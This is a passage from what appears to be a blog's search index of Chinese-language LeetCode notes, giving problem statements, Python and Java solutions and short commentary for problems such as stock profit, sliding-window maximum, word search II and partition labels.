sell.Example 2:\nInput: prices = [7,6,4,3,1]Output: 0Explanation: In this case, no transactions are done and the max profit = 0. Constraints:\n1 \u003c= prices.length \u003c= 1050 \u003c= prices[i] \u003c= 104 Sol 只能做一次就從最小的去算\nclass Solution: def maxProfit(self, prices: List[int]) -\u0026gt; int: small = math.inf ret = 0 for p in prices: small = min(small, p) ret = max(ret, p-small) return ret ","permalink":"https://littlebees.github.io/2021/01/leetcode-121-best-time-to-buy-and-sell-stock/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e經典的stock系列題目的開始\u003c/p\u003e","title":"leetcode-121 - Best Time to Buy and Sell Stock"},{"content":"動機 搞懂調整sliding window的條件\nProblem Given a string s and an integer k, return the length of the longest substring of s such that the frequency of each character in this substring is greater than or equal to k.\nExample 1:\nInput: s = aaabb, k = 3Output: 3Explanation: The longest substring is aaa, as 'a' is repeated 3 times.Example 2:\nInput: s = ababbc, k = 2Output: 5Explanation: The longest substring is ababb, as 'a' is repeated 2 times and 'b' is repeated 3 times. Constraints:\n1 \u003c= s.length \u003c= 104s consists of only lowercase English letters.1 \u003c= k \u003c= 105 Sol: divide-and-conquer 無腦一直分割，一邊統計，一邊看有沒有不合的，就繼續分割\nclass Solution: def f(self,i,j): if j-i \u0026lt;= 1: return j-i if j-i \u0026gt;= self.k else 0 else: tbl = Counter(self.s[i:j]) for k in range(i,j): if tbl[self.s[k]] \u0026lt; self.k: return max(self.f(i,k), self.f(k+1,j)) return j-i if j-i \u0026gt;= self.k else 0 def longestSubstring(self, s: str, k: int) -\u0026gt; int: self.s = list(s) self.k = k return self.f(0,len(s)) Sol2: sliding window 當初第一眼看到就想用，但是沒有用成，因為無法判斷，要怎麼往上漲，往右縮\n根本原因是同時牽扯到\n長度 字母數 長度當然是越長越好，但要怎麼判斷要讓windows停止生長與縮小，如果不限制字母數會無法判斷該漲還是該縮\n所以要把其中一個固定下來，因為要找的是長度，所以變成固定字母數，以此為條件讓windows變化\nclass Solution: def longestSubstring(self, s: str, k: int) -\u0026gt; int: s = list(s) ret = 0 for maxDiffAlpha in range(1,len(set(s))+1): i = 0 j = 0 cnt = {} cntAlpha = 0 howManyK = 0 while j \u0026lt; len(s): if cntAlpha \u0026lt;= maxDiffAlpha: if cnt.get(s[j],0) == 0: cnt[s[j]] = 0 cntAlpha += 1 cnt[s[j]] += 1 if cnt[s[j]] == k: howManyK += 1 j += 1 else: if cnt[s[i]] == k: howManyK -= 1 cnt[s[i]] -= 1 if cnt[s[i]] == 0: cntAlpha -= 1 i += 1 if cntAlpha == maxDiffAlpha and cntAlpha == howManyK: ret = max(ret, j-i) return ret ","permalink":"https://littlebees.github.io/2021/01/leetcode-395-longest-substring-with-at-least-k-repeating-characters/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e搞懂調整sliding window的條件\u003c/p\u003e","title":"leetcode-395 - Longest Substring with At Least K Repeating Characters"},{"content":"動機 十分有趣的題目\nProblem We build a table of n rows (1-indexed). We start by writing 0 in the 1st row. Now in every subsequent row, we look at the previous row and replace each occurrence of 0 with 01, and each occurrence of 1 with 10.\nFor example, for n = 3, the 1st row is 0, the 2nd row is 01, and the 3rd row is 0110.Given two integer n and k, return the kth (1-indexed) symbol in the nth row of a table of n rows.\nExample 1:\nInput: n = 1, k = 1Output: 0Explanation: row 1: 0Example 2:\nInput: n = 2, k = 1Output: 0Explanation:row 1: 0row 2: 01Example 3:\nInput: n = 2, k = 2Output: 1Explanation:row 1: 0row 2: 01Example 4:\nInput: n = 3, k = 1Output: 0Explanation:row 1: 0row 2: 01row 3: 0110 Constraints:\n1 \u003c= n \u003c= 301 \u003c= k \u003c= 2n - 1 Sol: complete binary tree 給定深度與第幾個就可以透過binary去locate在樹上移動的方向\n詳細可以看1261\nclass Solution: def f(self,dirs): acc = 0 for d in dirs: if acc == 0: acc = 0 if d == \u0026#39;0\u0026#39; else 1 else: acc = 1 if d == \u0026#39;0\u0026#39; else 0 return acc def kthGrammar(self, N: int, K: int) -\u0026gt; int: dirs = list(format(2**(N-1)+(K-1),\u0026#39;b\u0026#39;))[1:] return self.f(dirs) Sol2: recursion 從root根據N與K會發現沒辦法判斷要怎麼走，所以改從leaf看，可以看到類似上面的走法，但這裡不用reverse是用recursion\n一開始是當K為奇數時是0，偶數為1；在翻轉過後當K為奇數時是1，偶數為2\ndef f(n,k): if n == 1: return False else: ret = f(n-1,math.ceil(k/2)) if k % 2 == 1: return ret else: return not ret class Solution: def kthGrammar(self, N: int, K: int) -\u0026gt; int: return 1 if f(N,K) else 0 def f(n,k): if n == 1: return False else: ret = f(n-1,math.ceil(k/2)) if ret: # flip return k % 2 == 1 else: return k % 2 == 0 class Solution: def kthGrammar(self, N: int, K: int) -\u0026gt; int: return 1 if f(N,K) else 0 Sol3: count bit 把K扣一，變成0-based indexing，轉成binary，數有幾個1，就是被翻轉幾次，偶數次就是0，奇數次就是1\nclass Solution: def kthGrammar(self, N: int, K: int) -\u0026gt; int: return bin(K-1).count(\u0026#39;1\u0026#39;)%2 ","permalink":"https://littlebees.github.io/2021/01/leetcode-779-k-th-symbol-in-grammar/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e十分有趣的題目\u003c/p\u003e","title":"leetcode-779 - K-th Symbol in Grammar"},{"content":"動機 要與560一起看\nProblem Given an integer array nums and an integer k, return true if nums has a continuous subarray of size at least two whose elements sum up to a multiple of k, or false otherwise.\nAn integer x is a multiple of k if there exists an integer n such that x = n * k. 0 is always a multiple of k.\nExample 1:\nInput: nums = [23,2,4,6,7], k = 6Output: trueExplanation: [2, 4] is a continuous subarray of size 2 whose elements sum up to 6.Example 2:\nInput: nums = [23,2,6,4,7], k = 6Output: trueExplanation: [23, 2, 6, 4, 7] is an continuous subarray of size 5 whose elements sum up to 42.42 is a multiple of 6 because 42 = 7 * 6 and 7 is an integer.Example 3:\nInput: nums = [23,2,6,4,7], k = 13Output: false Constraints:\n1 \u003c= nums.length \u003c= 1050 \u003c= nums[i] \u003c= 1090 \u003c= sum(nums[i]) \u003c= 231 - 11 \u003c= k \u003c= 231 - 1 Sol: 看是不是倍數 存連續和，之後就是一次一次試看有沒有k的倍數\nclass Solution: def checkSubarraySum(self, nums: List[int], k: int) -\u0026gt; bool: ret = False sums = [] cnt = 0 nums = [0] + nums #[0,0],0 # sum(nums[j:i]) = sums[:i] - sum[:j] - for i in range(len(nums)): cnt += nums[i] if cnt == k and i \u0026gt; 1: return True for j in range(len(sums)): #print(i,j) if k == 0: if (cnt - sums[j]) == 0: #print((i-j) \u0026gt; 1) ret = ret or (i-j) \u0026gt; 1 elif (cnt - sums[j]) % k == 0: #print((i-j) \u0026gt; 1) ret = ret or (i-j) \u0026gt; 1 #not only this sol [23, 2, \u0026#34;6\u0026#34;, 4, 7], k=6 sums.append(cnt) if ret : return True return False Sol2: 取餘數 sum[j] - sum[i] = a[j] + ... + a[i+1] 如果是k的倍數都取餘會變成 sum[j]%k - sum[i]%k = 0\nclass Solution: def checkSubarraySum(self, nums: List[int], k: int) -\u0026gt; bool: check = {} check[0] = -1 pre_sum = 0 for i,num in enumerate(nums): pre_sum += num if k != 0: pre_sum %= k if pre_sum in check: if i - check[pre_sum] \u0026gt; 1: return True else: check[pre_sum] = i return False ","permalink":"https://littlebees.github.io/2021/01/leetcode-523-continuous-subarray-sum/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e要與560一起看\u003c/p\u003e","title":"leetcode-523 - Continuous Subarray Sum"},{"content":"動機 看到greedy解後恍然大悟\nProblem You are given a string s. We want to partition the string into as many parts as possible so that each letter appears in at most one part.\nReturn a list of integers representing the size of these parts.\nExample 1:\nInput: s = ababcbacadefegdehijhklijOutput: [9,7,8]Explanation:The partition is ababcbaca, defegde, hijhklij.This is a partition so that each letter appears in at most one part.A partition like ababcbacadefegde, hijhklij is incorrect, because it splits s into less parts.Example 2:\nInput: s = eccbbbbdecOutput: [10] Constraints:\n1 \u003c= s.length \u003c= 500s consists of lowercase English letters. Sol: stack 把每個字元當成一個一個區塊，如果stack中有出現過的字元就做interval merge\nclass Solution: def partitionLabels(self, S: str) -\u0026gt; List[int]: stk = [] for i in range(len(S)): j = len(stk)-1 while j \u0026gt;= 0 and S[i] not in stk[j][1]: j -= 1 if j \u0026lt; 0: stk.append([1,set([S[i]])]) else: for _ in range(len(stk)-j-1): tmp = stk.pop() stk[-1][0] += tmp[0] stk[-1][1] = stk[-1][1] | tmp[1] stk[-1][0] += 1 #print(stk,S[:i+1]) return [seg[0] for seg in stk] Sol2: greedy 如果能知道每個字元的最後位置(hash)，就能知道這個區塊的最後位置!!\nclass Solution(object): def partitionLabels(self, S): last = {c: i for i, c in enumerate(S)} end = start = 0 ans = [] for i, c in enumerate(S): end = max(end, last[c]) if i == end: ans.append(i - start + 1) start = i + 1 return ans ","permalink":"https://littlebees.github.io/2021/01/leetcode-763-partition-labels/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e看到greedy解後恍然大悟\u003c/p\u003e","title":"leetcode-763 - Partition Labels"},{"content":"動機 當初想說只要看到第一個不對的點就可以了，但沒想到的是overlap與根本沒有需要的case\u0026hellip;，所以一直出事 [1,2,3,3,3]\nProblem Given an integer array nums, you need to find one continuous subarray that if you only sort this subarray in ascending order, then the whole array will be sorted in ascending order.\nReturn the shortest such subarray and output its length.\nExample 1:\nInput: nums = [2,6,4,8,10,9,15]Output: 5Explanation: You need to sort [6, 4, 8, 10, 9] in ascending order to make the whole array sorted in ascending order.Example 2:\nInput: nums = [1,2,3,4]Output: 0Example 3:\nInput: nums = [1]Output: 0 Constraints:\n1 \u003c= nums.length \u003c= 104-105 \u003c= nums[i] \u003c= 105 Follow up: Can you solve it in O(n) time complexity? Sol 從左往右找a[i]\u0026gt;a[j]的最小值 (上升) 從右往左找a[j]\u0026lt;a[i]的最大值 (下降) 在左右兩邊去找要插入的位置 求長度 class Solution: def findUnsortedSubarray(self, nums: List[int]) -\u0026gt; int: if len(nums) \u0026lt;= 1: return 0 a = min([i for i in range(1,len(nums)) if nums[i-1] \u0026gt; nums[i]],key=lambda x: nums[x],default=len(nums)-1) b = max([i for i in reversed(range(len(nums)-1)) if nums[i] \u0026gt; nums[i+1]],key=lambda x: nums[x],default=0) l = bisect_right(nums[:a],nums[a]) r = b+bisect_left(nums[b+1:],nums[b]) return 0 if r - l \u0026lt; 0 else r - l + 1; case study: stack 一個是單調遞增，一個是單調遞減，可以用stack直接在pop的過程中確定是到哪一個index\npublic class Solution { public int findUnsortedSubarray(int[] nums) { Stack \u0026lt; Integer \u0026gt; stack = new Stack \u0026lt; Integer \u0026gt; (); int l = nums.length, r = 0; for (int i = 0; i \u0026lt; nums.length; i++) { while (!stack.isEmpty() \u0026amp;\u0026amp; nums[stack.peek()] \u0026gt; nums[i]) l = Math.min(l, stack.pop()); stack.push(i); } stack.clear(); for (int i = nums.length - 1; i \u0026gt;= 0; i--) { while (!stack.isEmpty() \u0026amp;\u0026amp; nums[stack.peek()] \u0026lt; nums[i]) r = Math.max(r, stack.pop()); stack.push(i); } return r - l \u0026gt; 0 ? r - l + 1 : 0; } } 或是用monotonic stack把要sort的chunk用出來，最後把要合併的chunk合起來\nclass Solution: def findUnsortedSubarray(self, nums: List[int]) -\u0026gt; int: stk = [] for n in nums: item = [n,1] while stk and (stk[-1][0] \u0026gt; n): m, cnt = stk.pop() item = [max(item[0],m), cnt+item[1]] stk += item, a,b = 0,len(stk)-1 while a\u0026lt;len(stk) and stk[a][1] == 1: a += 1 while 0\u0026lt;=b and stk[b][1] == 1: b -= 1 #print(stk) return sum([seg[1] for seg in stk[a:b+1]], 0) ","permalink":"https://littlebees.github.io/2021/01/leetcode-581-shortest-unsorted-continuous-subarray/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e當初想說只要看到第一個不對的點就可以了，但沒想到的是overlap與根本沒有需要的case\u0026hellip;，所以一直出事\n\u003ccode\u003e[1,2,3,3,3]\u003c/code\u003e\u003c/p\u003e","title":"leetcode-581 - Shortest Unsorted Continuous Subarray"},{"content":"動機 第一次看到DP比較慢\nProblem Given a string s, return the number of palindromic substrings in it.\nA string is a palindrome when it reads the same backward as forward.\nA substring is a contiguous sequence of characters within the string.\nExample 1:\nInput: s = abcOutput: 3Explanation: Three palindromic strings: a, b, c.Example 2:\nInput: s = aaaOutput: 6Explanation: Six palindromic strings: a, a, a, aa, aa, aaa. Constraints:\n1 \u003c= s.length \u003c= 1000s consists of lowercase English letters. Sol1: DP 用DP看這個範圍是不是迴文，之後列舉\nclass Solution: @functools.cache def isPalin(self,i,j): if j-i \u0026lt; 0: return False elif j-i == 1 or j-i == 0: return True else: return (self.s[i] == self.s[j-1]) and self.isPalin(i+1,j-1) def countSubstrings(self, s: str) -\u0026gt; int: self.s = s ret = 0 for l in range(1,len(s)+1): for i in range(len(s)): if i+l \u0026lt;= len(s) and self.isPalin(i,i+l): ret += 1 return ret Sol2: expand 如果看一下時間複雜度，會發現DP解是O(n^2)\n都平方，為什麼不直接從每一點往左右兩側展開，也都是O(n^2)\nclass Solution: def countSubstrings(self, s: str) -\u0026gt; int: def search(i,j): ret = 0 while 0 \u0026lt;= i and j \u0026lt; len(s) and s[i] == s[j]: ret += 1 i -= 1 j += 1 return ret ret = 0 for i in range(len(s)): ret += search(i,i) + search(i,i+1) return ret ","permalink":"https://littlebees.github.io/2021/01/leetcode-647-palindromic-substrings/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e第一次看到DP比較慢\u003c/p\u003e","title":"leetcode-647 - Palindromic Substrings"},{"content":"動機 這應該是最短的leetcode code\nProblem You are given an array of people, people, which are the attributes of some people in a queue (not necessarily in order). Each people[i] = [hi, ki] represents the ith person of height hi with exactly ki other people in front who have a height greater than or equal to hi.\nReconstruct and return the queue that is represented by the input array people. The returned queue should be formatted as an array queue, where queue[j] = [hj, kj] is the attributes of the jth person in the queue (queue[0] is the person at the front of the queue).\nExample 1:\nInput: people = [[7,0],[4,4],[7,1],[5,0],[6,1],[5,2]]Output: [[5,0],[7,0],[5,2],[6,1],[4,4],[7,1]]Explanation:Person 0 has height 5 with no other people taller or the same height in front.Person 1 has height 7 with no other people taller or the same height in front.Person 2 has height 5 with two persons taller or the same height in front, which is person 0 and 1.Person 3 has height 6 with one person taller or the same height in front, which is person 1.Person 4 has height 4 with four people taller or the same height in front, which are people 0, 1, 2, and 3.Person 5 has height 7 with one person taller or the same height in front, which is person 1.Hence [[5,0],[7,0],[5,2],[6,1],[4,4],[7,1]] is the reconstructed queue.Example 2:\nInput: people = [[6,0],[5,0],[4,0],[3,2],[2,2],[1,4]]Output: [[4,0],[5,0],[2,2],[3,2],[1,4],[6,0]] Constraints:\n1 \u003c= people.length \u003c= 20000 \u003c= hi \u003c= 1060 \u003c= ki \u003c people.lengthIt is guaranteed that the queue can be reconstructed. Sol 前面有幾個可以當成偏離量，那中間比自己大的數字要怎麼來?\n讓比自己大的數字先出現在queue中\nclass Solution: def reconstructQueue(self, ps: List[List[int]]) -\u0026gt; List[List[int]]: ps.sort(key=lambda x: (-x[0],x[1])) # [[7,0], [7,1], [6,1], [5,0], [5,2], [4,4]] # =\u0026gt; [[5,0],[7,0],[5,2],[6,1],[4,4],[7,1]] # [7,0] [7,1] # [6,1] # [5,0] [5,2] # [4,4] ret = [] for p in ps: ret.insert(p[1],p) return ret ","permalink":"https://littlebees.github.io/2021/01/leetcode-406-queue-reconstruction-by-height/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這應該是最短的leetcode code\u003c/p\u003e","title":"leetcode-406 - Queue Reconstruction by Height"},{"content":"動機 現在只要用到stack就會讓我想到merge interval\nProblem Given an array of integers temperatures represents the daily temperatures, return an array answer such that answer[i] is the number of days you have to wait after the ith day to get a warmer temperature. If there is no future day for which this is possible, keep answer[i] == 0 instead.\nExample 1:\nInput: temperatures = [73,74,75,71,69,72,76,73]Output: [1,1,4,2,1,1,0,0]Example 2:\nInput: temperatures = [30,40,50,60]Output: [1,1,1,0]Example 3:\nInput: temperatures = [30,60,90]Output: [1,1,0] Constraints:\n1 \u003c= temperatures.length \u003c= 10530 \u003c= temperatures[i] \u003c= 100 Sol stack的promise是底下的大於上面的\nclass Solution: def dailyTemperatures(self, T: List[int]) -\u0026gt; List[int]: stk = [len(T)-1] # promise: stk[i] \u0026gt; stk[j] ret = [0] for i in reversed(range(len(T)-1)): while stk and T[stk[-1]] \u0026lt;= T[i]: stk.pop() if not stk: ret.append(0) else: ret.append(stk[-1]-i) stk.append(i) ret.reverse() return ret ","permalink":"https://littlebees.github.io/2021/01/leetcode-739-daily-temperatures/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e現在只要用到stack就會讓我想到merge interval\u003c/p\u003e","title":"leetcode-739 - Daily Temperatures"},{"content":"動機 數論不好，當初居然是用算出來的商去看有沒有重複\nProblem Given two integers representing the numerator and denominator of a fraction, return the fraction in string format.\nIf the fractional part is repeating, enclose the repeating part in parentheses.\nIf multiple answers are possible, return any of them.\nIt is guaranteed that the length of the answer string is less than 104 for all the given inputs.\nExample 1:\nInput: numerator = 1, denominator = 2Output: 0.5Example 2:\nInput: numerator = 2, denominator = 1Output: 2Example 3:\nInput: numerator = 2, denominator = 3Output: 0.(6)Example 4:\nInput: numerator = 4, denominator = 333Output: 0.(012)Example 5:\nInput: numerator = 1, denominator = 5Output: 0.2 Constraints:\n-231 \u003c= numerator, denominator \u003c= 231 - 1denominator != 0 Sol 會出現重複就是因為要除的數字之前看過了，所以要看餘數有沒有出現過，不是看算出來的商有沒有出現過，有的是商是一樣的(\u0026ldquo;0.(0588235294117647)\u0026rdquo;)\n再來就是要先把所有數字轉成正數，不然會出事\nclass Solution: def f(self,n,d): if n % d == 0: self.ans += self.tbl self.ans.append(str(n//d)) return if str(n//d) == \u0026#39;0\u0026#39;: self.tbl.append(str(n//d)) self.f(n*10,d) elif str(n//d) not in self.tbl: print(str(n//d), (n%d)*10) self.tbl.append(str(n//d)) self.f((n%d)*10,d) else: y = str(n//d) for (i,x) in enumerate(self.tbl): if x == y: self.ans.append(\u0026#34;(\u0026#34;) self.ans += [str(a) for a in self.tbl[i:]] self.ans.append(\u0026#34;)\u0026#34;) return else: self.ans.append(str(x)) def fractionToDecimal(self, n: int, d: int) -\u0026gt; str: self.tbl = [] self.ans = [] self.ans.append(str(n//d)) if n \u0026gt; d: n = n//d if n%d != 0: self.ans.append(\u0026#34;.\u0026#34;) self.f((n%d)*10,d) print(self.ans) return \u0026#39;\u0026#39;.join(self.ans) ","permalink":"https://littlebees.github.io/2021/01/leetcode-166-fraction-to-recurring-decimal/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e數論不好，當初居然是用算出來的商去看有沒有重複\u003c/p\u003e","title":"leetcode-166 - Fraction to Recurring Decimal"},{"content":"動機 原來lru_cache搭配dfs可以達到判有沒有visited的效果!!\nProblem Given an m x n board of characters and a list of strings words, return all words on the board.\nEach word must be constructed from letters of sequentially adjacent cells, where adjacent cells are horizontally or vertically neighboring. The same letter cell may not be used more than once in a word.\nExample 1:\nInput: board = [[o,a,a,n],[e,t,a,e],[i,h,k,r],[i,f,l,v]], words = [oath,pea,eat,rain]Output: [eat,oath]Example 2:\nInput: board = [[a,b],[c,d]], words = [abcb]Output: [] Constraints:\nm == board.lengthn == board[i].length1 \u003c= m, n \u003c= 12board[i][j] is a lowercase English letter.1 \u003c= words.length \u003c= 3 * 1041 \u003c= words[i].length \u003c= 10words[i] consists of lowercase English letters.All the strings of words are unique. Sol 都是dfs+trie去看有沒有單字，不過要注意的是像[app,apple]不能在看到app就停下來\nclass Solution: def buildTrie(self): self.trie = [None, {}] for (i,w) in enumerate(self.ws): tmp = self.trie for c in w: if c not in tmp[1]: tmp[1][c] = [None, {}] tmp = tmp[1][c] tmp[0] = i def hasChar(self,trie,c): if c in trie[1]: return trie[1][c] else: return [None, {}] def dfs(self,i,j, trie, pos): if i \u0026lt; 0 or i \u0026gt;= len(self.b) or j \u0026lt; 0 or j \u0026gt;= len(self.b[0]): return [] else: trie2 = self.hasChar(trie,self.b[i][j]) ret = [] if trie2[0] is None else [self.ws[trie2[0]]] if trie2[1]: dirs = [x for x in [(i+1,j),(i-1,j),(i,j+1),(i,j-1)] if x not in pos] for p in dirs: ret += self.dfs(p[0],p[1],trie2,pos+[p]) return ret def findWords(self, board: List[List[str]], ws: List[str]) -\u0026gt; List[str]: self.ws = ws self.buildTrie() #print(self.trie) self.b = board ret = [] for i in range(len(board)): for j in range(len(board[0])): ret += self.dfs(i,j,self.trie,[(i,j)]) return list(set(ret)) Sol2: lru_cache與標記來標visited 為了避免找重複\n(ret): 改trie來看有沒有看過這個單字 (dfs的表): 走過的路就mark掉 backtracking常用技巧: 走過的路就mark掉，其實與改trie一樣 (列舉點): lru_cache避免dfs再走一次 class TrieNode: def __init__(self): self.children = defaultdict(TrieNode) self.isWord = False class Trie: def __init__(self): self.root = TrieNode() def add(self, word): node = self.root for letter in word: node = node.children[letter] node.isWord = True class Solution: def buildTrie(self): for word in self.ws: self.trie.add(word) @lru_cache(None) def dfs(self,i,j, trie,cur): if trie.isWord: self.ret.append(cur) trie.isWord = False if 0 \u0026lt;= i \u0026lt; len(self.b) and 0 \u0026lt;= j \u0026lt; len(self.b[0]): if self.b[i][j] != \u0026#39;#\u0026#39;: dirs = [(0, 1), (1, 0), (0, -1), (-1, 0)] now = self.b[i][j] tmpTrie = trie.children.get(now) if tmpTrie: tmpCur = cur+now self.b[i][j] = \u0026#39;#\u0026#39; for (x,y) in dirs: self.dfs(i+x,j+y,tmpTrie,tmpCur) self.b[i][j] = now def findWords(self, board: List[List[str]], ws: List[str]) -\u0026gt; List[str]: self.ws = ws self.trie = Trie() self.buildTrie() #print(self.trie) self.b = board self.ret = [] for i in range(len(board)): for j in range(len(board[0])): self.dfs(i,j,self.trie.root,\u0026#34;\u0026#34;) return self.ret ","permalink":"https://littlebees.github.io/2021/01/leetcode-212-word-search-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e原來lru_cache搭配dfs可以達到判有沒有visited的效果!!\u003c/p\u003e","title":"leetcode-212 - Word Search II"},{"content":"動機 從sliding window到寫merge interval的變化版\nProblem You are given an array of integers nums, there is a sliding window of size k which is moving from the very left of the array to the very right. You can only see the k numbers in the window. Each time the sliding window moves right by one position.\nReturn the max sliding window.\nExample 1:\nInput: nums = [1,3,-1,-3,5,3,6,7], k = 3Output: [3,3,5,5,6,7]Explanation: Window position Max--------------- -----[1 3 -1] -3 5 3 6 7 3 1 [3 -1 -3] 5 3 6 7 3 1 3 [-1 -3 5] 3 6 7 5 1 3 -1 [-3 5 3] 6 7 5 1 3 -1 -3 [5 3 6] 7 6 1 3 -1 -3 5 [3 6 7] 7Example 2:\nInput: nums = [1], k = 1Output: [1]Example 3:\nInput: nums = [1,-1], k = 1Output: [1,-1]Example 4:\nInput: nums = [9,11], k = 2Output: [11]Example 5:\nInput: nums = [4,-2], k = 2Output: [4] Constraints:\n1 \u003c= nums.length \u003c= 105-104 \u003c= nums[i] \u003c= 1041 \u003c= k \u003c= nums.length Sol1: heapq 除了heapq去排序，還要一個hash去紀錄出現次數，以免heapq的最大值其實已經不再windows中了\nclass Solution: def maxSlidingWindow(self, nums: List[int], k: int) -\u0026gt; List[int]: maxQ = [] cnt = {} ret = [] for i in range(k): heappush(maxQ, -nums[i]) if nums[i] not in cnt: cnt[nums[i]] = 1 else: cnt[nums[i]] += 1 i = k while maxQ and i \u0026lt;= len(nums): ret.append(-maxQ[0]) cnt[nums[i-k]] -= 1 while maxQ and cnt[-maxQ[0]] == 0: heappop(maxQ) if i \u0026lt; len(nums): heappush(maxQ, -nums[i]) if nums[i] not in cnt: cnt[nums[i]] = 1 else: cnt[nums[i]] += 1 i += 1 return ret Sol2: deque 與寫merge interval很像，但是多一個條件，第一個值必須是在range中\nclass Solution: def maxSlidingWindow(self, nums: List[int], k: int) -\u0026gt; List[int]: q = deque() ret = [] for i in range(len(nums)): if q and q[0] == i-k: # promise1: q[0] is max \u0026amp; in [i-k+1:i+1] q.popleft() while q and nums[q[-1]] \u0026lt;= nums[i]: # promise2: q[0] \u0026gt; q[1] \u0026gt; .... q.pop() q.append(i) if i \u0026gt;= k-1: ret.append(nums[q[0]]) return ret ","permalink":"https://littlebees.github.io/2021/01/leetcode-239-sliding-window-maximum/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e從sliding window到寫merge interval的變化版\u003c/p\u003e","title":"leetcode-239 - Sliding Window Maximum"},{"content":"動機 主要是紀錄在tree上做這題的做法\nProblem Given the root of a Binary Search Tree and a target number k, return true if there exist two elements in the BST such that their sum is equal to the given target.\nExample 1:\nInput: root = [5,3,6,2,4,null,7], k = 9Output: trueExample 2:\nInput: root = [5,3,6,2,4,null,7], k = 28Output: falseExample 3:\nInput: root = [2,1,3], k = 4Output: trueExample 4:\nInput: root = [2,1,3], k = 1Output: falseExample 5:\nInput: root = [2,1,3], k = 3Output: true Constraints:\nThe number of nodes in the tree is in the range [1, 104].-104 \u003c= Node.val \u003c= 104root is guaranteed to be a valid binary search tree.-105 \u003c= k \u003c= 105 Sol: preorder + 2sum 先走preorder，就會有sorted list，接下去就是2sum\nclass Solution: def preorder(self, r): if not r: return else: self.preorder(r.left) self.ret.append(r.val) self.preorder(r.right) def findTarget(self, root: TreeNode, k: int) -\u0026gt; bool: self.ret = [] self.preorder(root) print(self.ret) i, j = 0, len(self.ret) - 1 while i \u0026lt; j: if self.ret[i] + self.ret[j] == k: return True elif self.ret[i] + self.ret[j] \u0026lt; k: i += 1 else: j -= 1 return False case study: recur + hash 用hash記錄看過的數字，等到遇到對的數字\npublic class Solution { public boolean findTarget(TreeNode root, int k) { Set \u0026lt; Integer \u0026gt; set = new HashSet(); return find(root, k, set); } public boolean find(TreeNode root, int k, Set \u0026lt; Integer \u0026gt; set) { if (root == null) return false; if (set.contains(k - root.val)) return true; set.add(root.val); return find(root.left, k, set) || find(root.right, k, set); } } ","permalink":"https://littlebees.github.io/2021/01/leetcode-653-two-sum-iv-input-is-a-bst/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e主要是紀錄在tree上做這題的做法\u003c/p\u003e","title":"leetcode-653 - Two Sum IV - Input is a BST"},{"content":"動機 想起優化LC 127的過程\nProblem Given two strings s and p, return an array of all the start indices of p's anagrams in s. You may return the answer in any order.\nExample 1:\nInput: s = cbaebabacd, p = abcOutput: [0,6]Explanation:The substring with start index = 0 is cba, which is an anagram of abc.The substring with start index = 6 is bac, which is an anagram of abc.Example 2:\nInput: s = abab, p = abOutput: [0,1,2]Explanation:The substring with start index = 0 is ab, which is an anagram of ab.The substring with start index = 1 is ba, which is an anagram of ab.The substring with start index = 2 is ab, which is an anagram of ab. Constraints:\n1 \u003c= s.length, p.length \u003c= 3 * 104s and p consist of lowercase English letters. Sol1 就是sliding windows，但是window裡面連不在pattern中的也一起放進來，導致每次檢查就要先排除不在pattern的字元，這樣會拖慢執行時間\nclass Solution: def findAnagrams(self, s: str, p: str) -\u0026gt; List[int]: ret = [] i = 0 j = len(p) #print(p) p = Counter(list(p)) cnt = dict(Counter(s[i:j])) #print(cnt) while i \u0026lt; j and j \u0026lt;= len(s): if all([(k not in p and v == 0) or (k in p and p[k] == v) for (k,v) in cnt.items()]): ret.append(i) if j \u0026lt; len(s): if s[j] not in cnt: cnt[s[j]] = 1 else: cnt[s[j]] += 1 j += 1 cnt[s[i]] -= 1 i += 1 #print(i,j,cnt) return ret Sol2 在生紀錄window的counter時不把不需要的字元放進去，這樣除了讓執行效率提升，還讓程式變簡單了\n這讓我突然想到之前寫BFS(LC 127)是一次把狀態生到需要的狀態，而不是去檢查能不能從起點轉移到下一個狀態，讓效率上升\n這裡是不讓不需要的東西進入需要多次檢查的狀態中，這兩個對我來說都有一點類似的感覺\n另外關於Counter有兩件事\nCounter有預設值!! 可以直接比 class Solution: def findAnagrams(self, s: str, p: str) -\u0026gt; List[int]: ret = [] i = 0 j = len(p) #print(p) p = Counter(list(p)) cnt = Counter([c for c in s[i:j] if c in p]) while i \u0026lt; j and j \u0026lt;= len(s): if cnt == p: ret.append(i) if j \u0026lt; len(s) and s[j] in p: cnt[s[j]] += 1 j += 1 if s[i] in p: cnt[s[i]] -= 1 i += 1 #print(i,j,cnt) return ret ","permalink":"https://littlebees.github.io/2021/01/leetcode-438-find-all-anagrams-in-a-string/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e想起優化LC 127的過程\u003c/p\u003e","title":"leetcode-438 - Find All Anagrams in a String"},{"content":"動機 真的就是DPㄟ\nProblem Given a non-empty array nums containing only positive integers, find if the array can be partitioned into two subsets such that the sum of elements in both subsets is equal.\nExample 1:\nInput: nums = [1,5,11,5]Output: trueExplanation: The array can be partitioned as [1, 5, 5] and [11].Example 2:\nInput: nums = [1,2,3,5]Output: falseExplanation: The array cannot be partitioned into equal sum subsets. Constraints:\n1 \u003c= nums.length \u003c= 2001 \u003c= nums[i] \u003c= 100 Sol 看起來是要找兩個set，但是總和是一樣的，所以變成看能不能從中湊出總和就好\nclass Solution: @functools.cache def f(self,i,cnt): if cnt \u0026lt; 0 or i \u0026lt; 0: return False elif cnt == 0: return True else: return self.f(i-1,cnt) or 